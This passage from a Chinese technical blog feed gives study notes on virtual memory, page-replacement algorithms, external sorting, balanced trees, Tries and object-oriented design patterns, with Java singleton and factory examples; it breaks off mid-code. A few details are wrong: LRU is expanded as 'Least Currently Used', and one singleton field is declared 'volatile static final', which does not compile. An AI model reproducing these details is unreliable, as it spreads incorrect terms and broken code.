<h3 id="虚拟内存的技术实现"><a href="#虚拟内存的技术实现" class="headerlink" title="虚拟内存的技术实现"></a>虚拟内存的技术实现</h3><p>虚拟内存的实现需要建立在离散分配的内存管理方式的基础上。 虚拟内存的实现有以下三种方式：</p>
<ol>
<li>请求分页存储管理 ：建立在分页管理之上，为了支持虚拟存储器功能而增加了请求调页功能和页面置换功能。请求分页是目前最常用的一种实现虚拟存储器的方法。请求分页存储管理系统中，在作业开始运行之前，仅装入当前要执行的部分段即可运行。假如在作业运行的过程中发现要访问的页面不在内存，则由处理器通知操作系统按照对应的页面置换算法将相应的页面调入到主存，同时操作系统也可以将暂时不用的页面置换到外存中。</li>
<li>请求分段存储管理 ：建立在分段存储管理之上，增加了请求调段功能、分段置换功能。请求分段储存管理方式就如同请求分页储存管理方式一样，在作业开始运行之前，仅装入当前要执行的部分段即可运行；在执行过程中，可使用请求调入中断动态装入要访问但又不在内存的程序段；当内存空间已满，而又需要装入新的段时，根据置换功能适当调出某个段，以便腾出空间而装入新的段。</li>
<li>请求段页式存储管理</li>
</ol>
<p><strong>请求分页与分页存储管理，两者有何不同呢？</strong></p>
<p>请求分页存储管理建立在分页管理之上。他们的根本区别是是否将程序全部所需的全部地址空间都装入主存，这也是请求分页存储管理可以提供虚拟内存的原因，我们在上面已经分析过了。</p>
<p>它们之间的根本区别在于是否将一作业的全部地址空间同时装入主存。请求分页存储管理不要求将作业全部地址空间同时装入主存。基于这一点，请求分页存储管理可以提供虚存，而分页存储管理却不能提供虚存。</p>
<p>不管是上面那种实现方式，我们一般都需要：</p>
<ol>
<li>一定容量的内存和外存：在载入程序的时候，只需要将程序的一部分装入内存，而将其他部分留在外存，然后程序就可以执行了；</li>
<li>缺页中断：如果需执行的指令或访问的数据尚未在内存（称为缺页或缺段），则由处理器通知操作系统将相应的页面或段调入到内存，然后继续执行程序；</li>
<li>虚拟地址空间 ：逻辑地址到物理地址的变换。</li>
</ol>
<h3 id="页面置换算法"><a href="#页面置换算法" class="headerlink" title="页面置换算法"></a>页面置换算法</h3><p>地址映射过程中，若在页面中发现所要访问的页面不在内存中，则发生缺页中断 。</p>
<blockquote>
<p>缺页中断就是要访问的页不在主存，需要操作系统将其调入主存后再进行访问。 在这个时候，被内存映射的文件实际上成了一个分页交换文件。</p>
</blockquote>
<p>当发生缺页中断时，如果当前内存中并没有空闲的页面，操作系统就必须在内存选择一个页面将其移出内存，以便为即将调入的页面让出空间。用来选择淘汰哪一页的规则叫做页面置换算法，可以把页面置换算法看成是淘汰页面的规则。</p>
<ul>
<li>OPT 页面置换算法（最佳页面置换算法） ：最佳（Optimal, OPT）置换算法所选择的被淘汰页面将是以后永不使用的，或者是在最长时间内不再被访问的页面,这样可以保证获得最低的缺页率。但由于人们目前无法预知进程在内存下的若千页面中哪个是未来最长时间内不再被访问的，因而该算法无法实现。一般作为衡量其他置换算法的方法。</li>
<li>FIFO（First In First Out） 页面置换算法（先进先出页面置换算法） ：总是淘汰最先进入内存的页面，即选择在内存中驻留时间最久的页面进行淘汰。</li>
<li>LRU （Least Currently Used）页面置换算法（最近最久未使用页面置换算法） ：LRU算法赋予每个页面一个访问字段，用来记录一个页面自上次被访问以来所经历的时间 T，当须淘汰一个页面时，选择现有页面中其 T 值最大的，即最近最久未使用的页面予以淘汰。</li>
<li>LFU （Least Frequently Used）页面置换算法（最少使用页面置换算法） ：该置换算法选择在之前时期使用最少的页面作为淘汰页。</li>
</ul>
]]></content>
      <categories>
        <category>base</category>
      </categories>
      <tags>
        <tag>408</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构</title>
    <url>/2021/12/21/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><h2 id="外部排序"><a href="#外部排序" class="headerlink" title="外部排序"></a>外部排序</h2><p><a href="https://www.bilibili.com/video/BV1gJ411u7JF?from=search&amp;seid=15373464297409923473&amp;spm_id_from=333.337.0.0">https://www.bilibili.com/video/BV1gJ411u7JF?from=search&amp;seid=15373464297409923473&amp;spm_id_from=333.337.0.0</a></p>
<h3 id="多路归并排序"><a href="#多路归并排序" class="headerlink" title="多路归并排序"></a>多路归并排序</h3><p>外部排序指的是大文件的排序，即待排序的记录存储在外存储器上，待排序的文件无法一次装入内存，需要在内存和外部存储器之间进行多次数据交换，以达到排序 整个文件的目的。外部排序最常用的算法是多路归并排序，即将原文件分解成多个能够一次性装入内存的部分，分别把每一部分调入内存完成排序。然后，对已经排序的子文件进行多路归并排序。</p>
<p>缺点：每个数字需要两次io，于是就有了选择置换排序来减少io</p>
<p>题目：</p>
<p>若外部存储上有3110400个记录，做6路平衡归并排序，计算机内存工作区能容纳400个记录，则排序好所有记录，需要作几趟归并排序（ ）</p>
<p>答案：5</p>
<p>log(6,3110400&#x2F;400) &#x3D; 5</p>
<h3 id="选择置换排序（用来构造初始归并段）"><a href="#选择置换排序（用来构造初始归并段）" class="headerlink" title="选择置换排序（用来构造初始归并段）"></a>选择置换排序（用来构造初始归并段）</h3><ul>
<li>先将内存放满，然后取出一个最小的，接着从外存中放入一个，然后再取出一个最小的（可以考虑用堆排序）</li>
<li>直到内存中最小的比外存中最大的小，然后就把内存中这个标记一下，继续取第二小的，直到内存中最大的比外存中最大的小，一趟排序结束，此时外存的为初始归并段，相比于多路归并排序来说，这个选归并段省去了多次io。</li>
<li>接着和之前一样的步骤，最后会得到多个归并段</li>
<li>然后使用多路归并排序来排序</li>
</ul>
<p>缺点：归并段的长度不一致， 怎么选择归并段会影响io次数，于是就有了最佳归并数来选择最佳的归并序列</p>
<h3 id="最佳归并树"><a href="#最佳归并树" class="headerlink" title="最佳归并树"></a>最佳归并树</h3><p>类似于哈夫曼树</p>
<h3 id="败者树"><a href="#败者树" class="headerlink" title="败者树"></a>败者树</h3><p>在内存中的数选出一个最小的（频繁执行），可以使用堆，但是败者树更好用。</p>
<p>用堆的话每次调整之后不好记录这个数是舒服几个归并段的，而败者树不会。</p>
<h2 id="Chaos"><a href="#Chaos" class="headerlink" title="Chaos"></a>Chaos</h2><h3 id="红黑树（RB-tree）比AVL树的优势在哪？"><a href="#红黑树（RB-tree）比AVL树的优势在哪？" class="headerlink" title="红黑树（RB-tree）比AVL树的优势在哪？"></a>红黑树（RB-tree）比AVL树的优势在哪？</h3><p>红黑树的特性:<br>（1）每个节点或者是黑色，或者是红色。<br>（2）根节点是黑色。<br>（3）每个叶子节点（NIL）是黑色。 [注意：这里叶子节点，是指为空(NIL或NULL)的叶子节点！]<br>（4）如果一个节点是红色的，则它的子节点必须是黑色的。<br>（5）从一个节点到该节点的子孙节点的所有路径上包含相同数目的黑节点。</p>
<p>定理：<strong>一棵含有n个节点的红黑树的高度至多为2log(n+1)</strong>.</p>
<p>首先红黑树是不符合AVL树的平衡条件的，即每个节点的左子树和右子树的高度最多差1的二叉查找树。但是提出了为节点增加颜色，红黑是用非严格的平衡来换取增删节点时候旋转次数的降低，任何不平衡都会在三次旋转之内解决，而AVL是严格平衡树，因此在增加或者删除节点的时候，根据不同情况，旋转的次数比红黑树要多。所以红黑树的插入效率更高！！！</p>
<p>红黑树的查询性能略微逊色于AVL树，因为他比avl树会稍微不平衡最多多一层，也就是说红黑树的查询性能只比相同内容的avl树最多多一次比较，但是，红黑树在插入和删除上完爆avl树， avl树每次插入删除会进行大量的平衡度计算，而红黑树为了维持红黑性质所做的红黑变换和旋转的开销，相较于avl树为了维持平衡的开销要小得多 </p>
<p>所以简单说，如果你的应用中，搜索的次数远远大于插入和删除，那么选择AVL，如果搜索，插入删除次数几乎差不多，应该选择RB。</p>
<h3 id="面试之Trie树特点和应用场景"><a href="#面试之Trie树特点和应用场景" class="headerlink" title="面试之Trie树特点和应用场景"></a>面试之Trie树特点和应用场景</h3><p>优点：</p>
<ol>
<li><p>Trie进行对某个string查找的时间复杂度为O(m)，m为string中字符个数。相比较，BST（二叉搜索树）的时间复杂度是O(logN），在树不平衡的情况下，为O(N)；</p>
</li>
<li><p>利用字符串的公共前缀来减少查询时间，最大限度的减少无谓的字符串比较，查询效率比哈希树高。</p>
</li>
<li><p>Trie可以生成以字母顺序排序的键值对集合</p>
</li>
<li><p>自带排序功能</p>
</li>
</ol>
<p>缺点：</p>
<ol>
<li><p>Trie在搜索效率上可能会比Hash慢。</p>
</li>
<li><p>有些键（key），例如浮点数，有很长的前序节点，可能会导致内存过大或者搜索效率下降。虽然bitwise trie可以处理这种情况，但需要针对特定的情境编写多余的代码。</p>
</li>
<li><p>在空间复杂度上，Trie的开销可能会多于Hashtable申请的内存。Trie的每一个节点可能会有多个孩子（例如每个节点最多可能有a-z 26个孩子），这个多层的Trie对内存开销很大。</p>
</li>
</ol>
<p>Trie的应用场景</p>
<ol>
<li><p>保存一本字典，英文字典大约只有50,000个单词，并且Trie还演化出来一种叫做<a href="http://en.wikipedia.org/wiki/Directed_acyclic_word_graph">Directed acyclic word graph</a>的东西，它将后缀一样的字符串也进行了压缩，所以空间利用率有了进一步提高。所以Trie在空间利用率上不会比Binary Search Tree差太多。</p>
</li>
<li><p>根据保存的字典，可以预测用户输入内容</p>
</li>
<li><p>断词和拼写查错软件也运用了Trie – spellings&#x2F;suggestions&#x2F;type-ahead-lookup&#x2F;auto-completion&#x2F;<br>这些应用场景都有一个特点，就是不是单独地查询一个词，而是获取以有一定字母顺序的一组字符串</p>
</li>
</ol>
]]></content>
      <categories>
        <category>408</category>
      </categories>
      <tags>
        <tag>408</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式</title>
    <url>/2022/03/01/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a><a href="http://c.biancheng.net/view/1333.html">设计模式</a></h1><h2 id="面向对象设计原则-迪米特和依依开始k"><a href="#面向对象设计原则-迪米特和依依开始k" class="headerlink" title="面向对象设计原则(迪米特和依依开始k)"></a>面向对象设计原则(迪米特和依依开始k)</h2><ul>
<li><p><strong>开</strong>闭原则:  对扩展开放，对修改关闭; 降低维护带来的新风险</p>
</li>
<li><p>里<strong>氏</strong>替换原则: 子类可以扩展父类的功能，但不能改变父类原有的功能。也就是说：子类继承父类时，除添加新的方法完成新增功能外，尽量不要重写父类的方法。(例如几维鸟不是鸟的例子)</p>
</li>
<li><p><strong>依</strong>赖倒置原则: 高层不应该依赖低层，要面向接口编程;  更利于代码结构的升级扩展</p>
</li>
<li><p>单<strong>一</strong>职责原则: 一个类只干一件事，实现类要单一; 便于理解，提高代码的可读性</p>
</li>
<li><p>接<strong>口</strong>隔离原则: 一个接口只干一件事，接口要精简单一; 功能解耦，高聚合、低耦合</p>
</li>
<li><p>迪米特法则: 如果两个软件实体无须直接通信，那么就不应当发生直接的相互调用，可以通过第三方转发该调用。其目的是降低类之间的耦合度，提高模块的相对独立性。</p>
</li>
<li><p>合成复用原则:  尽量使用组合或者聚合关系实现代码复用，少使用继承,如果要使用继承关系，则必须严格遵循里氏替换原则。合成复用原则同里氏替换原则相辅相成的，两者都是开闭原则的具体实现规范。 降低代码耦合.(例如汽车分类管理程序)</p>
<blockquote>
<p>通常类的复用分为继承复用和合成复用两种，继承复用虽然有简单和易实现的优点，但它也存在以下缺点。</p>
</blockquote>
</li>
</ul>
<blockquote>
<ol>
<li>继承复用破坏了类的封装性。因为继承会将父类的实现细节暴露给子类，父类对子类是透明的，所以这种复用又称为“白箱”复用。</li>
<li>子类与父类的耦合度高。父类的实现的任何改变都会导致子类的实现发生变化，这不利于类的扩展与维护。</li>
<li>它限制了复用的灵活性。从父类继承而来的实现是静态的，在编译时已经定义，所以在运行时不可能发生变化。</li>
</ol>
<p>采用组合或聚合复用时，可以将已有对象纳入新对象中，使之成为新对象的一部分，新对象可以调用已有对象的功能，它有以下优点。</p>
<ol>
<li>它维持了类的封装性。因为成分对象的内部细节是新对象看不见的，所以这种复用又称为“黑箱”复用。</li>
<li>新旧类之间的耦合度低。这种复用所需的依赖较少，新对象存取成分对象的唯一方法是通过成分对象的接口。</li>
<li>复用的灵活性高。这种复用可以在运行时动态进行，新对象可以动态地引用与成分对象类型相同的对象。</li>
</ol>
</blockquote>
<ol>
<li>创建型模式：用于描述“怎样创建对象”，它的主要特点是“将对象的创建与使用分离”。GoF 中提供了单例、原型、工厂方法、抽象工厂、建造者等 5 种创建型模式。</li>
<li>结构型模式：用于描述如何将类或对象按某种布局组成更大的结构，GoF 中提供了代理、适配器、桥接、装饰、外观、享元、组合等 7 种结构型模式。</li>
<li>行为型模式：用于描述类或对象之间怎样相互协作共同完成单个对象都无法单独完成的任务，以及怎样分配职责。GoF 中提供了模板方法、策略、命令、职责链、状态、观察者、中介者、迭代器、访问者、备忘录、解释器等 11 种行为型模式。</li>
</ol>
<h2 id="单例模式（Singleton-Pattern）"><a href="#单例模式（Singleton-Pattern）" class="headerlink" title="单例模式（Singleton Pattern）"></a>单例模式（Singleton Pattern）</h2><p>优:在内存中只有一个实例,减少内存的开销; 避免对资源的多重占用;</p>
<p>缺:一般没有接口,扩展困难,违背开闭原则;不利于代码调试,如果单例没有执行完,不能模拟生成一个新的对象;单例模式的功能通常写在一个类中,如果功能设计不合理,容易违背单一职责原则;</p>
<p>应用场景: </p>
<ul>
<li><p>某类只要求生成一个对象的时候,如一个班的班长,每个人的身份证号.</p>
</li>
<li><p>某些类创建实例时间较长或占用系统资源很多,且经常使用</p>
</li>
<li><p>某类需要频繁实例化,又频繁销毁,例如多线程线程池,网路连接池</p>
</li>
<li><p>频繁访问数据库或文件</p>
</li>
<li><p>对于一些控制硬件级别的操作，或者从系统上来讲应当是单一控制逻辑的操作，如果有多个实例，则系统会完全乱套。</p>
</li>
<li><p>当对象需要被共享的场合。由于单例模式只允许创建一个对象，共享该对象可以节省内存，并加快对象访问速度。如 Web 中的配置对象、数据库的连接池等。</p>
</li>
</ul>
<p>懒汉式实现:</p>
<p>该模式的特点是类加载时没有生成单例，只有当第一次调用 getlnstance 方法时才去创建这个单例。</p>
<p>必须要加volatile, 有反射,这个还是不安全的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-13 10:12 上午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazySingleton</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 保证instance在所有线程中同步,必须加volatile</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="type">LazySingleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * private避免在外部被实例化</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">LazySingleton</span><span class="params">()</span> &#123;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 加synchronized同步</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> LazySingleton</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> LazySingleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">            instance = <span class="keyword">new</span> <span class="title class_">LazySingleton</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-23 11:26 上午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazySingleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="type">LazySingleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">LazySingleton</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 假设对象已经有了，很多人只是取实例，不应该被锁住，</span></span><br><span class="line"><span class="comment">     * 使用dcl可以解决这个问题</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> LazySingleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// Double Check Lock</span></span><br><span class="line">            <span class="keyword">synchronized</span> (LazySingleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                   instance = <span class="keyword">new</span> <span class="title class_">LazySingleton</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>饿汉式实现:</p>
<p>该模式的特点是类一旦加载就创建一个单例，保证在调用 getInstance 方法之前单例已经存在了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-13 10:20 上午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HungrySingleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">HungrySingleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HungrySingleton</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">HungrySingleton</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HungrySingleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>枚举实现:</p>
<p>枚举有个默认有参构造器, 两个参数string in</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> singletion;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-27 10:09 上午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">EnumSingle</span> &#123;</span><br><span class="line">    INSTANCE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> EnumSingle <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test02</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">EnumSingle</span> <span class="variable">instance</span> <span class="operator">=</span> EnumSingle.INSTANCE;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Constructor&lt;EnumSingle&gt; declaredConstructor = EnumSingle.class.getDeclaredConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">            declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">EnumSingle</span> <span class="variable">enumSingle</span> <span class="operator">=</span> declaredConstructor.newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="原型模式-Prototype"><a href="#原型模式-Prototype" class="headerlink" title="原型模式(Prototype)"></a>原型模式(Prototype)</h2><p>通过拷贝原型创建新的对象,由于 Java 提供了对象的 clone() 方法，所以用 Java 实现原型模式很简单。克隆</p>
<h2 id="工厂模式-Factory-Pattern"><a href="#工厂模式-Factory-Pattern" class="headerlink" title="工厂模式(Factory Pattern)"></a>工厂模式(Factory Pattern)</h2><p>不同条件下创造不同实例. 工厂</p>
<h3 id="简单工厂模式"><a href="#简单工厂模式" class="headerlink" title="简单工厂模式"></a>简单工厂模式</h3><p>在简单工厂模式中创建实例的方法通常为静态（static）方法，因此简单工厂模式（Simple Factory Pattern）又叫作静态工厂方法模式（Static Factory Method Pattern）。</p>
<p>优: 客户端可以免除直接创建产品的职责,很方便的创建出相应的产品;客户端无需知道所创建的产品的类名,只需知道参数即可;也可以引入配置文件,在不修改客户端代码的情况下更换和添加产品</p>
<p>缺: </p>
<ol>
<li>简单工厂模式的工厂类单一，负责所有产品的创建，职责过重，一旦异常，整个系统将受影响。且工厂类代码会非常臃肿，违背高聚合原则。</li>
<li>使用简单工厂模式会增加系统中类的个数（引入新的工厂类），增加系统的复杂度和理解难度</li>
<li>系统扩展困难，一旦增加新产品不得不修改工厂逻辑，在产品类型较多时，可能造成逻辑过于复杂</li>
<li>简单工厂模式使用了 static 工厂方法，造成工厂角色无法形成基于继承的等级结构。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//抽象产品</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//具体产品：ProductA</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ConcreteProduct1</span> <span class="keyword">implements</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;具体产品1显示...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//具体产品：ProductB</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ConcreteProduct2</span> <span class="keyword">implements</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;具体产品2显示...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Const</span> &#123;</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">PRODUCT_A</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">PRODUCT_B</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">PRODUCT_C</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SimpleFactory</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Product <span class="title function_">makeProduct</span><span class="params">(<span class="type">int</span> kind)</span> &#123;</span><br><span class="line">            <span class="keyword">switch</span> (kind) &#123;</span><br><span class="line">                <span class="keyword">case</span> Const.PRODUCT_A:</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConcreteProduct1</span>();</span><br><span class="line">                <span class="keyword">case</span> Const.PRODUCT_B:</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConcreteProduct2</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="工厂方法模式"><a href="#工厂方法模式" class="headerlink" title="工厂方法模式"></a>工厂方法模式</h3><p>“工厂方法模式”是对简单工厂模式的进一步抽象化，其好处是可以使系统在不修改原来代码的情况下引进新的产品，即满足开闭原则。</p>
<p>满足里氏替换原则, 迪米特法则,依赖倒置原则</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FactoryMethod;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AbstractFactoryTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Product a;</span><br><span class="line">            AbstractFactory af;</span><br><span class="line">            af = (AbstractFactory) ReadXML1.getObject();</span><br><span class="line">            a = af.newProduct();</span><br><span class="line">            a.show();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//抽象产品：提供了产品的接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//具体产品1：实现抽象产品中的抽象方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ConcreteProduct1</span> <span class="keyword">implements</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;具体产品1显示...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//具体产品2：实现抽象产品中的抽象方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ConcreteProduct2</span> <span class="keyword">implements</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;具体产品2显示...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//抽象工厂：提供了厂品的生成方法</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">AbstractFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Product <span class="title function_">newProduct</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//具体工厂1：实现了厂品的生成方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ConcreteFactory1</span> <span class="keyword">implements</span> <span class="title class_">AbstractFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Product <span class="title function_">newProduct</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;具体工厂1生成--&gt;具体产品1...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConcreteProduct1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//具体工厂2：实现了厂品的生成方法</span></span><br><span class="line"><span 